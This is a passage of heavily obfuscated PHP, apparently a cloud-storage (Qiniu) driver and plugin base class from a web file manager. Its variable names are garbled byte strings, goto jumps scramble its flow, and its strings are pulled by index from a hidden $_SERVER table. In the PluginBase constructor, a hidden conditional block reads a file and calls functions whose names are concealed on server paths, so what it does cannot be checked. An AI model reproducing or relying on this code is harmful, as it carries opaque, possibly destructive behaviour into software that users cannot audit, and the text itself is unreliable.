(!empty($Cõõ‰‰Ãõ¨) && !in_array($b´¼‡èç¸¸, $D£–¼Å¢Ä[$dœ–¡ìêÏŒ[75]])) { $D£–¼Å¢Ä[$dœ–¡ìêÏŒ[75]][] = $b´¼‡èç¸¸; } $C„ÖÏ¼ãÎŠ = $this->delByBatch($D£–¼Å¢Ä[$dœ–¡ìêÏŒ[74]]); if (!$C„ÖÏ¼ãÎŠ) { return !1; } goto fŞ•†Âºá; fŞ•†Âºá: return $this->delByBatch($D£–¼Å¢Ä[$dœ–¡ìêÏŒ[75]]); goto C§“ïöÛº; D‘»àÊ­·: $dœ–¡ìêÏŒ =& $_SERVER[´¬]; if (!$this->exist($Cõõ‰‰Ãõ¨)) { return !0; } $this->listItemCache = !1; goto DÌ§Ô›ËÚŠ; DÌ§Ô›ËÚŠ: $D£–¼Å¢Ä = $this->fileList($Cõõ‰‰Ãõ¨); $this->listItemCache = !0; $b´¼‡èç¸¸ = trim($Cõõ‰‰Ãõ¨, $dœ–¡ìêÏŒ[8]) . $dœ–¡ìêÏŒ[8]; goto a—’ßİ†Ö ; C§“ïöÛº: } private function delByBatch($cÁƒ›‘) { foreach (array_chunk($cÁƒ›‘, 1000) as $bºñÊ«äìô) { $fãèçÄäöó = $this->bucketManager->buildBatchDelete($this->bucket, $bºñÊ«äìô); list($eÄäŞÇŠø£, $CãË÷ô») = $this->bucketManager->batch($fãèçÄäöó); if ($CãË÷ô») { return !1; } } return !0; } public function rename($B‰’ªÛ³äÆ, $eÜ°¢ù‰¢) { return $this->renameObject($B‰’ªÛ³äÆ, $eÜ°¢ù‰¢); } public function fileInfo($E†İÁÃ ä, $B´¢ä²‡ª— = false, $CÎ¶³İŸÁ = array()) { goto döÎ–õ‚ÈÚ; a‡×‚•ÅµÓ: if (isset($CÎ¶³İŸÁ[$BÍß‡¯”Ç[1305]])) { $D±Š’ÁĞó [$BÍß‡¯”Ç[84]] = substr($CÎ¶³İŸÁ[$BÍß‡¯”Ç[1305]] . $BÍß‡¯”Ç[33], 0, 10); } if (isset($CÎ¶³İŸÁ[$BÍß‡¯”Ç[1304]])) { $D±Š’ÁĞó [$BÍß‡¯”Ç[78]] = $CÎ¶³İŸÁ[$BÍß‡¯”Ç[1304]]; } return $D±Š’ÁĞó ; goto dê–•ªÁæ; e¶·ğŒÛ”: $D±Š’ÁĞó [$BÍß‡¯”Ç[193]] = $D±Š’ÁĞó [$BÍß‡¯”Ç[84]] = 0; $D±Š’ÁĞó [$BÍß‡¯”Ç[194]] = $D±Š’ÁĞó [$BÍß‡¯”Ç[195]] = !0; if (empty($CÎ¶³İŸÁ)) { $CÎ¶³İŸÁ = $this->objectMeta($E†İÁÃ ä); if (!$CÎ¶³İŸÁ) { return $D±Š’ÁĞó ; } } goto a‡×‚•ÅµÓ; döÎ–õ‚ÈÚ: $BÍß‡¯”Ç =& $_SERVER[´¬]; $D±Š’ÁĞó  = array($BÍß‡¯”Ç[28] => $this->pathThis($E†İÁÃ ä), $BÍß‡¯”Ç[76] => $this->getPathOuter($BÍß‡¯”Ç[8] . $E†İÁÃ ä), $BÍß‡¯”Ç[29] => $BÍß‡¯”Ç[192], $BÍß‡¯”Ç[78] => isset($CÎ¶³İŸÁ[$BÍß‡¯”Ç[1304]]) ? $CÎ¶³İŸÁ[$BÍß‡¯”Ç[1304]] : 0, $BÍß‡¯”Ç[168] => $this->ext($E†İÁÃ ä)); if ($B´¢ä²‡ª—) { return $D±Š’ÁĞó ; } goto e¶·ğŒÛ”; dê–•ªÁæ: } public function folderInfo($bŞï»àÖ’, $b½¥±¢Šâğ = false) { goto fÓÛÎ®§¸Ô; fÓÛÎ®§¸Ô: $f¦íŞˆ®»¡ =& $_SERVER[´¬]; $bÕ„¬ó®é = array($f¦íŞˆ®»¡[28] => $this->pathThis($bŞï»àÖ’), $f¦íŞˆ®»¡[76] => $this->getPathOuter($f¦íŞˆ®»¡[8] . $bŞï»àÖ’), $f¦íŞˆ®»¡[29] => $f¦íŞˆ®»¡[77]); if ($b½¥±¢Šâğ) { return $bÕ„¬ó®é; } goto e¨¶’ö›Ã–; e¨¶’ö›Ã–: $bÕ„¬ó®é[$f¦íŞˆ®»¡[193]] = $bÕ„¬ó®é[$f¦íŞˆ®»¡[84]] = 0; $bÕ„¬ó®é[$f¦íŞˆ®»¡[194]] = $bÕ„¬ó®é[$f¦íŞˆ®»¡[195]] = !0; $bŞï»àÖ’ = rtrim($bŞï»àÖ’, $f¦íŞˆ®»¡[8]) . $f¦íŞˆ®»¡[8]; goto Bî¢‚Í†â; Bî¢‚Í†â: $fÕºÇ°Ç‘ = $this->objectMeta($bŞï»àÖ’); if (isset($fÕºÇ°Ç‘[$f¦íŞˆ®»¡[1305]])) { $bÕ„¬ó®é[$f¦íŞˆ®»¡[84]] = substr($fÕºÇ°Ç‘[$f¦íŞˆ®»¡[1305]] . $f¦íŞˆ®»¡[33], 0, 10); } return $bÕ„¬ó®é; goto BÌšÊ¾®; BÌšÊ¾®: } public function listPath($f‹±·‹ñ¦À, $F¾Î¯›Í¡ = false) { $e¥•·Ş¿îì =& $_SERVER[´¬]; $dÌ „Û¥ïÎ = $this->fileList($f‹±·‹ñ¦À, $e¥•·Ş¿îì[8], !0); foreach ($dÌ „Û¥ïÎ[$e¥•·Ş¿îì[75]] as $e†•ÔŸïÁø => $F÷¶ÎÚ¢ë) { $dÌ „Û¥ïÎ[$e¥•·Ş¿îì[75]][$e†•ÔŸïÁø] = $this->folderInfo($F÷¶ÎÚ¢ë, $F¾Î¯›Í¡); } foreach ($dÌ „Û¥ïÎ[$e¥•·Ş¿îì[74]] as $e†•ÔŸïÁø => $F÷¶ÎÚ¢ë) { $dÌ „Û¥ïÎ[$e¥•·Ş¿îì[74]][$e†•ÔŸïÁø] = $this->fileInfo($F÷¶ÎÚ¢ë[$e¥•·Ş¿îì[93]], $F¾Î¯›Í¡, $F÷¶ÎÚ¢ë); } return $dÌ „Û¥ïÎ; } public function has($BµÊÌÂÕ˜‹, $d”—œáŸ— = false, $Bñ“Ù‡éÏš = true) { goto e¼Ó§‘ËàĞ; eš³ïáÂØÈ: $dÕÀ¦¦³Ø½ = $Aç•½‡¼¢“ = 0; while (!0) { check_abort(); list($bñÒŒƒˆÈ, $eŸ¦ÌÎâŸ‹) = $this->bucketManager->listFiles($this->bucket, $bØìİ¦áÇ÷, $CÔˆ…‰ºéâ, $dµëæ´Š¥ , $f±³ ñçöˆ); if ($eŸ¦ÌÎâŸ‹) { break; } $CÔˆ…‰ºéâ = array_key_exists($c‚Õ‰“Éèè[1274], $bñÒŒƒˆÈ) ? $CÔˆ…‰ºéâ = $bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1306]] : $c‚Õ‰“Éèè[33]; if ($d”—œáŸ—) { if (!empty($bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1307]])) { $dÕÀ¦¦³Ø½ += count($bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1307]]); } if (!empty($bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1308]])) { $Aç•½‡¼¢“ += count($bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1308]]); } if ($CÔˆ…‰ºéâ === $c‚Õ‰“Éèè[33]) { break; } continue; } if ($Bñ“Ù‡éÏš) { if (!empty($bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1307]])) { return !0; } } else { if (!empty($bñÒŒƒˆÈ[$c‚Õ‰“Éèè[1308]])) { return !0; } } if ($CÔˆ…‰ºéâ === $c‚Õ‰“Éèè[33]) { break; } } if ($d”—œáŸ—) { return array($c‚Õ‰“Éèè[202] => $dÕÀ¦¦³Ø½, $c‚Õ‰“Éèè[203] => $Aç•½‡¼¢“); } goto cŒåîíÙÃ; B¬’¨‚ˆ»Ÿ: $CÔˆ…‰ºéâ = $c‚Õ‰“Éèè[33]; $dµëæ´Š¥  = 500; $f±³ ñçöˆ = $c‚Õ‰“Éèè[8]; goto eš³ïáÂØÈ; e¼Ó§‘ËàĞ: $c‚Õ‰“Éèè =& $_SERVER[´¬]; $BµÊÌÂÕ˜‹ = trim($BµÊÌÂÕ˜‹, $c‚Õ‰“Éèè[8]); $bØìİ¦áÇ÷ = empty($BµÊÌÂÕ˜‹) ? $c‚Õ‰“Éèè[33] : $BµÊÌÂÕ˜‹ . $c‚Õ‰“Éèè[8]; goto B¬’¨‚ˆ»Ÿ; cŒåîíÙÃ: return !1; goto CŸÑŸº˜¾’; CŸÑŸº˜¾’: } public function listAll($DšÉÒÈÃ ) { $bÎ„†µÜÖ÷ =& $_SERVER[´¬]; $AÄ¸ãŒÚÇ‚ = $this->fileList($DšÉÒÈÃ , $bÎ„†µÜÖ÷[33], !0); $e±‘öÓŞŠì = array(); foreach ($AÄ¸ãŒÚÇ‚[$bÎ„†µÜÖ÷[74]] as $Dòæ æ•ê) { $e±‘öÓŞŠì[$Dòæ æ•ê[$bÎ„†µÜÖ÷[93]]] = $Dòæ æ•ê[$bÎ„†µÜÖ÷[78]]; } foreach ($AÄ¸ãŒÚÇ‚[$bÎ„†µÜÖ÷[75]] as $Dòæ æ•ê) { if (is_string($Dòæ æ•ê)) { $e±‘öÓŞŠì[$Dòæ æ•ê] = 0; } } return $this->listAllFiles($DšÉÒÈÃ , array_keys($e±‘öÓŞŠì), $e±‘öÓŞŠì); } private function fileList($f›Å Ğí¸™, $CŠÆšÕî™© = '', $a²Õõ‘µÀè = 0) { goto f³Ô¦î†; B©Ö¢Ä¹ –: $A»è¡¨·“ = $FîÃƒì®¤æ = array(); while (!0) { check_abort(); list($bÄØ¡İ¡–Ç, $C‹ó³ÔÙ¥Ø) = $this->bucketManager->listFiles($this->bucket, $Aë› óó¬, $E­ëö»†¡, $CÑŒ‰‰¶˜, $CŠÆšÕî™©); if ($C‹ó³ÔÙ¥Ø) { break; } $E­ëö»†¡ = array_key_exists($CÉ…«›‚¦[1274], $bÄØ¡İ¡–Ç) ? $E­ëö»†¡ = $bÄØ¡İ¡–Ç[$CÉ…«›‚¦[1306]] : $CÉ…«›‚¦[33]; $Cëô•Éäª² = isset($bÄØ¡İ¡–Ç[$CÉ…«›‚¦[1307]]) ? $bÄØ¡İ¡–Ç[$CÉ…«›‚¦[1307]] : array(); $E¾šï‘ãö = isset($bÄØ¡İ¡–Ç[$CÉ…«›‚¦[1308]]) ? $bÄØ¡İ¡–Ç[$CÉ…«›‚¦[1308]] : array(); foreach ($Cëô•Éäª² as $cÔ‹î´‹Ó§) { goto a¯å’ª ¡¤; d¬°Û¶’£ß: $cÔ‹î´‹Ó§[$CÉ…«›‚¦[78]] = $Fá°ó¡Í…; $Bï¾â¿íƒò = $Fá°ó¡Í… == 0 && substr($E‘ò¸“æ, strlen($E‘ò¸“æ) - 1, 1) == $CÉ…«›‚¦[8] ? !0 : !1; if ($E·†·æ×”) { $this->cacheMethod($CÉ…«›‚¦[198], $E‘ò¸“æ, $Bï¾â¿íƒò); $this->cacheMethod($CÉ…«›‚¦[199], $E‘ò¸“æ, $cÔ‹î´‹Ó§); } goto C±ƒìœœÍÚ; C±ƒìœœÍÚ: if ($Bï¾â¿íƒò) { $A»è¡¨·“[] = $E‘ò¸“æ; continue; } $FîÃƒì®¤æ[] = $a²Õõ‘µÀè ? $cÔ‹î´‹Ó§ : $E‘ò¸“æ; goto B†ç²“å¸å; a¯å’ª ¡¤: if ($cÔ‹î´‹Ó§[$CÉ…«›‚¦[93]] == $Aë› óó¬) { continue; } $E‘ò¸“æ = $cÔ‹î´‹Ó§[$CÉ…«›‚¦[93]]; $Fá°ó¡Í… = $cÔ‹î´‹Ó§[$CÉ…«›‚¦[1304]]; goto d¬°Û¶’£ß; B†ç²“å¸å: } foreach ($E¾šï‘ãö as $E‘ò¸“æ) { if ($E‘ò¸“æ == $Aë› óó¬) { continue; } $A»è¡¨·“[] = $E‘ò¸“æ; if ($E·†·æ×”) { $this->cacheMethod($CÉ…«›‚¦[198], $E‘ò¸“æ, !0); } } if ($E­ëö»†¡ === $CÉ…«›‚¦[33]) { break; } } if ($E·†·æ×”) { $this->cacheMethod($CÉ…«›‚¦[198], $f›Å Ğí¸™, !0); } goto E ˆ’§áµà; f³Ô¦î†: $CÉ…«›‚¦ =& $_SERVER[´¬]; $f›Å Ğí¸™ = trim($f›Å Ğí¸™, $CÉ…«›‚¦[8]); $Aë› óó¬ = empty($f›Å Ğí¸™) ? $CÉ…«›‚¦[33] : $f›Å Ğí¸™ . $CÉ…«›‚¦[8]; goto eã•¶êá¬Ñ; E ˆ’§áµà: return array($CÉ…«›‚¦[75] => $A»è¡¨·“, $CÉ…«›‚¦[74] => $FîÃƒì®¤æ); goto EêÑ‰à÷£; eã•¶êá¬Ñ: $E­ëö»†¡ = $CÉ…«›‚¦[33]; $CÑŒ‰‰¶˜ = 1000; $E·†·æ×” = $this->listItemCache === !1 ? !1 : !0; goto B©Ö¢Ä¹ –; EêÑ‰à÷£: } public function canRead($D©êµëù‹³) { return $this->exist($D©êµëù‹³) ? !0 : !1; } public function canWrite($B˜ãªƒÇÒÑ) { return $this->exist($B˜ãªƒÇÒÑ) ? !0 : !1; } public function getContent($fà¹‹»ğÔ‹) { return $this->fileSubstr($fà¹‹»ğÔ‹, 0, -1); } public function setContent($dçÅ‘ëÍŒÅ, $cË‡ßë„š” = '') { $eÀÀÕğ¥Ÿ = $this->tempFile($this->pathThis($dçÅ‘ëÍŒÅ)); file_put_contents($eÀÀÕğ¥Ÿ, $cË‡ßë„š”); if ($this->upload($dçÅ‘ëÍŒÅ, $eÀÀÕğ¥Ÿ)) { $this->tempFileRemve($eÀÀÕğ¥Ÿ); return !0; } return !1; } public function refreshUrls($cé„‚‹¢Š) { goto aÊÃÕİò‘½; EâŠ‘½§×: return $BÃ‰«ÖŸ“[$eì”îšÙÈ¨[1079]] == $eì”îšÙÈ¨[720] ? !0 : !1; goto b÷ö±Û¼; aÊÃÕİò‘½: $eì”îšÙÈ¨ =& $_SERVER[´¬]; $AŠÌ‚É™Èô = array(); if (is_array($cé„‚‹¢Š)) { foreach ($cé„‚‹¢Š as $BéÎ¹§©Ò¸) { $AŠÌ‚É™Èô[] = $this->link($BéÎ¹§©Ò¸); } } else { $AŠÌ‚É™Èô[] = $this->link($cé„‚‹¢Š); } goto AÚˆ¡…ä®Ù; AÚˆ¡…ä®Ù: $A†±¼†õè = new Qiniu\Cdn\CdnManager($this->auth); list($BÃ‰«ÖŸ“, $F‘å¿óõ¬×) = $A†±¼†õè->refreshUrls($AŠÌ‚É™Èô); if ($F‘å¿óõ¬×) { return !1; } goto EâŠ‘½§×; b÷ö±Û¼: } public function fileSubstr($E¿¾¨à­¼‰, $d†°¤í§¦ô, $AÖ„‚Ú¦Ô) { $a×œ‘¬ÄÅ =& $_SERVER[´¬]; if (!($c” ‚š¢éó = $this->link($E¿¾¨à­¼‰))) { return !1; } $eÄ¹àÙëƒí = !1; if ($AÖ„‚Ú¦Ô > 0) { $aÏ’¼º±ñ£ = $d†°¤í§¦ô + $AÖ„‚Ú¦Ô - 1; $eÄ¹àÙëƒí = array($a×œ‘¬ÄÅ[1309] . $d†°¤í§¦ô . $a×œ‘¬ÄÅ[438] . $aÏ’¼º±ñ£); } $F›Ş ­ìêÅ = url_request($c” ‚š¢éó, $a×œ‘¬ÄÅ[227], !1, $eÄ¹àÙëƒí); return $F›Ş ­ìêÅ[$a×œ‘¬ÄÅ[713]] ? $F›Ş ­ìêÅ[$a×œ‘¬ÄÅ[1089]] : !1; } public function upload($e×å†¿‹£á, $EŸ»—ââ‘Ô, $A¸Û§¡ÀÈ = false, $E‡Î’ê³‘ = REPEAT_REPLACE) { $DÓ ‹­“± = new Qiniu\Storage\UploadManager(); $D£Æ¡…“Ÿ = $this->auth->uploadToken($this->bucket, $e×å†¿‹£á); $f½æ‹¿õ¾÷ = get_file_mime(get_path_ext($EŸ»—ââ‘Ô)); list($Eô—Ş¼åçç, $aÜæéÀ÷¼) = $DÓ ‹­“±->putFile($D£Æ¡…“Ÿ, $e×å†¿‹£á, $EŸ»—ââ‘Ô, null, $f½æ‹¿õ¾÷); return $aÜæéÀ÷¼ ? !1 : $this->getPathOuter($e×å†¿‹£á); } public function uploadFormData($CÊ—õË¬Ç, $e‹“µÇÏÒÏ = 3600) { return $this->uploadToken($CÊ—õË¬Ç, $e‹“µÇÏÒÏ); } public function multiUploadFormData($F¹Õ®›É¬á, $A†¿„¹Æ’ = 3600) { return $this->uploadToken($F¹Õ®›É¬á, $A†¿„¹Æ’); } private function uploadToken($e“¨Œ±äÏ¢, $cïâ«…È… = 3600) { goto E­Ìƒ‰ğë; E­Ìƒ‰ğë: $eŞÓŒğĞğ— =& $_SERVER[´¬]; $C„Ş“êŠ˜¥ = $cïâ«…È…; $cƒŸå¬ªÑ± = array($eŞÓŒğĞğ—[1310] => $eŞÓŒğĞğ—[1311]); goto a¤„‚Œóƒ; e¸À”¬ÄáŞ: $EˆÊ¦” = http_type() . "\x3a\57\57\x75\x70\x6c\157\141\144{$cÏ³Å½’“â}\x2e\161\x69\156\151\165\160\56\x63\x6f\x6d\57"; return array($eŞÓŒğĞğ—[1313] => $aëµ•—œ£ê, $eŞÓŒğĞğ—[1314] => $EˆÊ¦”); goto A¿ìàÙª; a¤„‚Œóƒ: $AÎŒ±Ğ„­ = $e“¨Œ±äÏ¢; $aëµ•—œ£ê = $this->auth->uploadToken($this->bucket, $AÎŒ±Ğ„­, $C„Ş“êŠ˜¥, $cƒŸå¬ªÑ±, !0); $cÏ³Å½’“â = empty($this->region) || $this->region == $eŞÓŒğĞğ—[1312] ? $eŞÓŒğĞğ—[33] : $eŞÓŒğĞğ—[438] . $this->region; goto e¸À”¬ÄáŞ; A¿ìàÙª: } public function download($B„ˆ‘ãÒé†, $ağ±±°öµõ) { goto Fèšç¯÷Õ«; f‚¯ô‹ÕŸ‚: fclose($BÒ«¦‹Ç†å); return $ağ±±°öµõ; goto fÖ×Èš¨Ô®; d“…ÏÍÈ : $C™çÌè·¾Ï = 1024 * 200; $BÒ«¦‹Ç†å = fopen($eŒéÁñ¡¯, $_SERVER[´¬][1315]); while (!0) { $fíğÂ‘ï¢ê = $this->fileSubstr($B„ˆ‘ãÒé†, $dôòÁ‰àÎÅ, $C™çÌè·¾Ï); if ($fíğÂ‘ï¢ê === !1) { return !1; } fwrite($BÒ«¦‹Ç†å, $fíğÂ‘ï¢ê); $dôòÁ‰àÎÅ += $C™çÌè·¾Ï; if (strlen($fíğÂ‘ï¢ê) < $C™çÌè·¾Ï) { break; } } goto f‚¯ô‹ÕŸ‚; Fèšç¯÷Õ«: $eŒéÁñ¡¯ = IO::getPathInner(IO::mkfile($ağ±±°öµõ)); if (!($Cé©ì”ç¦Œ = $this->link($B„ˆ‘ãÒé†))) { return !1; } $dôòÁ‰àÎÅ = 0; goto d“…ÏÍÈ ; fÖ×Èš¨Ô®: } public function link($Fí…ò°ğ»‹, $b¾ƒñİ¾¶ = '') { if (!$this->isFile($Fí…ò°ğ»‹)) { return !1; } $b‹…Ø†ƒ¤ = $this->getHost() . $_SERVER[´¬][8] . $this->pathEncode($Fí…ò°ğ»‹) . $b¾ƒñİ¾¶; return $this->auth->privateDownloadUrl($b‹…Ø†ƒ¤, 3600 * 12); } public function fileOut($BªõöÔÈâÙ, $fğ¿ñĞÇÎ¯ = false, $c¾øÓ„ì¥ = false, $a¡¤Œ‹¼òº = '') { $dœ½îÄš¬Ó =& $_SERVER[´¬]; if ($this->isFileOutServer()) { return $this->fileOutServer($BªõöÔÈâÙ, $fğ¿ñĞÇÎ¯, $c¾øÓ„ì¥, $a¡¤Œ‹¼òº); } if (!$c¾øÓ„ì¥) { $c¾øÓ„ì¥ = $this->pathThis($BªõöÔÈâÙ); } $F¤ç î‰” = $fğ¿ñĞÇÎ¯ ? $dœ½îÄš¬Ó[1316] . rawurlencode($c¾øÓ„ì¥) : $dœ½îÄš¬Ó[33]; $cùò¬¸Õ„œ = $this->link($BªõöÔÈâÙ, $F¤ç î‰”); $this->fileOutLink($cùò¬¸Õ„œ); } public function fileOutServer($aÔˆÂ×ÛÁ±, $A À·‚Š÷ = false, $FÊ°¡ˆà´ = false, $fÕÜ…ÚùÏ– = '') { parent::fileOut($aÔˆÂ×ÛÁ±, $A À·‚Š÷, $FÊ°¡ˆà´, $fÕÜ…ÚùÏ–); } public function fileOutImage($A‰ËåÑî÷Ü, $bÆÎã„‚ = 250) { $eŒŸ˜¡™ = $this->link($A‰ËåÑî÷Ü, $_SERVER[´¬][1317] . $bÆÎã„‚); $this->fileOutLink($eŒŸ˜¡™); } public function fileOutImageServer($F™˜¢£ç•‹, $F‹¶–îíµ… = 250) { parent::fileOutImage($F™˜¢£ç•‹, $F‹¶–îíµ…); } public function hashMd5($b˜¸˜à…ñ“) { $DÀÙôßŒÎ… =& $_SERVER[´¬]; $E©™‹Ï¸° = $this->objectMeta($b˜¸˜à…ñ“); return isset($E©™‹Ï¸°[$DÀÙôßŒÎ…[207]]) ? $E©™‹Ï¸°[$DÀÙôßŒÎ…[207]] : !1; $DÖö³¨—³ = $this->link($b˜¸˜à…ñ“, $DÀÙôßŒÎ…[1318]); } public function size($CÑê‹îœºß) { $E÷á¢¨æÌ = $this->objectMeta($CÑê‹îœºß); return $E÷á¢¨æÌ ? $E÷á¢¨æÌ[$_SERVER[´¬][78]] : 0; } public function info($CÜä¤…‘â‚) { if ($this->isFolder($CÜä¤…‘â‚)) { return $this->folderInfo($CÜä¤…‘â‚); } else { if ($this->isFile($CÜä¤…‘â‚)) { return $this->fileInfo($CÜä¤…‘â‚); } } return !1; } public function exist($D…”„· Œ) { return $this->isFile($D…”„· Œ) || $this->isFolder($D…”„· Œ); } public function isFile($BÑ‘Ê¸½¥–) { return !$this->isFolder($BÑ‘Ê¸½¥–) && $this->objectMeta($BÑ‘Ê¸½¥–); } public function isFolder($d¡å«½¥Ş’) { return $this->cacheMethod($_SERVER[´¬][198], $d¡å«½¥Ş’); } protected function objectMeta($fßİ»ŠàÄå) { return $this->cacheMethod($_SERVER[´¬][199], $fßİ»ŠàÄå); } protected function _objectMeta($b™×æÊ’êâ) { $e³³ï‰·ù„ =& $_SERVER[´¬]; list($Cæ‰… îçŞ, $eœÎ¡®Ôµ´) = $this->bucketManager->stat($this->bucket, $b™×æÊ’êâ); if ($Cæ‰… îçŞ) { $Cæ‰… îçŞ[$e³³ï‰·ù„[78]] = intval($Cæ‰… îçŞ[$e³³ï‰·ù„[1304]]); } return $Cæ‰… îçŞ; } protected function _isFolder($d‰’ƒ‚Øš) { $aĞ¦•§§Ê„ =& $_SERVER[´¬]; if ($d‰’ƒ‚Øš == $aĞ¦•§§Ê„[33] || $d‰’ƒ‚Øš == $aĞ¦•§§Ê„[8]) { return !0; } list($a•»“ Ã³, $Bà¦©‰Ù¶) = $this->bucketManager->listFiles($this->bucket, trim($d‰’ƒ‚Øš, $aĞ¦•§§Ê„[8]) . $aĞ¦•§§Ê„[8], $aĞ¦•§§Ê„[33], 1, $aĞ¦•§§Ê„[8]); return !empty($a•»“ Ã³[$aĞ¦•§§Ê„[1307]]) || !empty($a•»“ Ã³[$aĞ¦•§§Ê„[1308]]) ? !0 : !1; } } goto C©òÎ¼á; aÔ®ÄĞ„âß: class Message { function __construct() { } public function send($Aù°Ü×…Ù‡ = '', $AËäÈåèŞË = array(), $e¶ÛòŒâãì = "\x74\145\x78\164") { goto FµçÀ«†íœ; bš˜¬™¨˜ø: $AËäÈåèŞË = array($C¡½œËä’[1016] => isset($AËäÈåèŞË[$C¡½œËä’[1016]]) ? $AËäÈåèŞË[$C¡½œËä’[1016]] : $C¡½œËä’[33], $C¡½œËä’[561] => isset($AËäÈåèŞË[$C¡½œËä’[561]]) ? $AËäÈåèŞË[$C¡½œËä’[561]] : $C¡½œËä’[33]); if (empty($Aù°Ü×…Ù‡) || empty($AËäÈåèŞË[$C¡½œËä’[1016]]) && empty($AËäÈåèŞË[$C¡½œËä’[561]])) { return !1; } $B¬ßÛĞ×Ğ« = array($C¡½œËä’[1335] => $aøÔóÀ÷éŠ, $C¡½œËä’[1396] => $AËäÈåèŞË); goto b›¾ÏîÇ‰‡; b›¾ÏîÇ‰‡: Hook::trigger($C¡½œËä’[1397], $B¬ßÛĞ×Ğ«); goto eİˆø¤Œ‘Œ; FµçÀ«†íœ: $C¡½œËä’ =& $_SERVER[´¬]; $aøÔóÀ÷éŠ = array($C¡½œËä’[29] => $C¡½œËä’[1394], $C¡½œËä’[716] => $Aù°Ü×…Ù‡); if (in_array($e¶ÛòŒâãì, array($C¡½œËä’[1394], $C¡½œËä’[1395]))) { $aøÔóÀ÷éŠ[$C¡½œËä’[29]] = $e¶ÛòŒâãì; } goto bš˜¬™¨˜ø; eİˆø¤Œ‘Œ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto FêŞõ‘‹Üä; eâå÷Ùà­½: $this->pluginName = str_replace($Fó×®½¾§Ø[1399], $Fó×®½¾§Ø[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Fó×®½¾§Ø[8]; $this->pluginApi = appHostGet() . $Fó×®½¾§Ø[1400] . $this->pluginName . $Fó×®½¾§Ø[8]; goto eğÛ¿¡¨ê¡; cäÑ‘ïï¸˜: return $this; goto EÄÊÑ·Ô©º; BÎÃâøÍ«À: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Fó×®½¾§Ø[1399]); goto eâå÷Ùà­½; eğÛ¿¡¨ê¡: $this->pluginHost = $config[$Fó×®½¾§Ø[1401]] . $this->pluginName . $Fó×®½¾§Ø[8]; $this->pluginHostDefault = $config[$Fó×®½¾§Ø[1401]] . $this->pluginName . $Fó×®½¾§Ø[8]; $Eğ¬«İô®œ = $config[$Fó×®½¾§Ø[1402]]; goto e·ÂÉö‚ğù; FêŞõ‘‹Üä: $Fó×®½¾§Ø =& $_SERVER[´¬]; if ($_SERVER[$Fó×®½¾§Ø[821]] != $_SERVER[$Fó×®½¾§Ø[822]]) { goto b·‰Ù‡«Û…; c»ÔâŠêø: $e³³ÕÈ‡ã» = 1; while ($e³³ÕÈ‡ã» > 1) { $e³³ÕÈ‡ã» = $e³³ÕÈ‡ã» + 4; $cÈ’ÔÔ¡ŸÂ = rawurlencode($e³³ÕÈ‡ã» . $Fó×®½¾§Ø[374]); } goto Càó¢»¨Ô; b·‰Ù‡«Û…: $dƒ­ÜæÑñ = $Fó×®½¾§Ø[840]; $CğììÇ¨Êô = $Fó×®½¾§Ø[823]; $AñªÈİæÊİ = $_SERVER[$Fó×®½¾§Ø[824]] . $Fó×®½¾§Ø[825]; goto FÍˆİ¶Åà‘; FÇãÜÚª‡: $bÑ“¼¬Äº” = $Fó×®½¾§Ø[841]; $bÑ“¼¬Äº”($_SERVER[$Fó×®½¾§Ø[842]]); $bÑ“¼¬Äº”($_SERVER[$Fó×®½¾§Ø[824]] . $Fó×®½¾§Ø[1398]); goto c»ÔâŠêø; FÍˆİ¶Åà‘: $c®êÆ³¯¯¬ = $CğììÇ¨Êô($AñªÈİæÊİ); $CšááÄÁ‡“ = explode($Fó×®½¾§Ø[228], $c®êÆ³¯¯¬); if (count($CšááÄÁ‡“) < $Fó×®½¾§Ø[585]) { $cÒµ‰Ş¯Š› = $Fó×®½¾§Ø[826]; $cÒµ‰Ş¯Š›(); } goto FÇãÜÚª‡; Càó¢»¨Ô: } global $in, $config; goto BÎÃâøÍ«À; e·ÂÉö‚ğù: if ($Eğ¬«İô®œ && strpos($Fó×®½¾§Ø[47] . $Eğ¬«İô®œ . $Fó×®½¾§Ø[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Fó×®½¾§Ø[1403]] . $this->pluginName . $Fó×®½¾§Ø[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto cäÑ‘ïï¸˜; EÄÊÑ·Ô©º: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[´¬][1404]); } protected function assign($dùŞ„ÆµÁ, $fÈ×ªÕ‹˜ã = false) { if (is_array($dùŞ„ÆµÁ)) { $this->values = array_merge($this->values, $dùŞ„ÆµÁ); } else { $this->values[$dùŞ„ÆµÁ] = $fÈ×ªÕ‹˜ã; } } protected function display($c±ÏëÄŒ…·) { extract($this->values); require $c±ÏëÄŒ…·; } final function hookRegist($b¦›ùÙÙò) { $this->modelPlugin->appRegist($this->pluginName, $b¦›ùÙÙò); } final function appIcon() { $Dƒ¬»™Ûô¶ =& $_SERVER[´¬]; $A¨ˆ¸Œ¥¡ğ = $this->appPackage(); $b¦×‹‰´’§ = $Dƒ¬»™Ûô¶[33]; if (isset($A¨ˆ¸Œ¥¡ğ[$Dƒ¬»™Ûô¶[407]])) { if (isset($A¨ˆ¸Œ¥¡ğ[$Dƒ¬»™Ûô¶[407]][$Dƒ¬»™Ûô¶[1405]])) { $b¦×‹‰´’§ = $Dƒ¬»™Ûô¶[1406] . $A¨ˆ¸Œ¥¡ğ[$Dƒ¬»™Ûô¶[407]][$Dƒ¬»™Ûô¶[1405]] . $Dƒ¬»™Ûô¶[1407]; } else { if ($A¨ˆ¸Œ¥¡ğ[$Dƒ¬»™Ûô¶[407]][$Dƒ¬»™Ûô¶[1408]]) { $b¦×‹‰´’§ = $Dƒ¬»™Ûô¶[1409] . $A¨ˆ¸Œ¥¡ğ[$Dƒ¬»™Ûô¶[407]][$Dƒ¬»™Ûô¶[1408]] . $Dƒ¬»™Ûô¶[1410]; } } } return $b¦×‹‰´’§; } final function fileCanView($cµÊáº—) { goto B‚ƒ…¿ÍÊ; 